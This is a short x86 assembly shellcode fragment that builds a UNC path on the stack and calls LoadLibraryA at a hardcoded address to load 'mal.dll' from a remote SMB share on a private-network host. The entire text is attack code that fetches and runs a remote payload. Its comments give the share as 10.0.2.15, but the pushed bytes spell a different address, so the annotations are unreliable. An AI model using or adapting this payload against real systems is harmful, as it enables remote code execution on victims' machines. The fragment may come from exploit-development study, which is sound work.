sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
                        ; overwriting our shellcode
xor ebx,ebx             ; Zero out EBX that will be the NULL byte terminating
                        ; the UNC path
push ebx                ; PUSH NULL byte
push 0x6c6c642e         ; \\10.0.2.15\ABC\mal.dll reversed
push 0x6c616d5c
push 0x4342415c
push 0x3233322e
push 0x302e302e
push 0x30315c5c


push esp                ; Push pointer of the UNC path
mov ebx,0x76ba12a0      ; Move into EBX the address of 'LoadLibraryA'
call ebx                ; call 'LoadLibraryA("\\10.0.2.15\ABC\mal.dll")'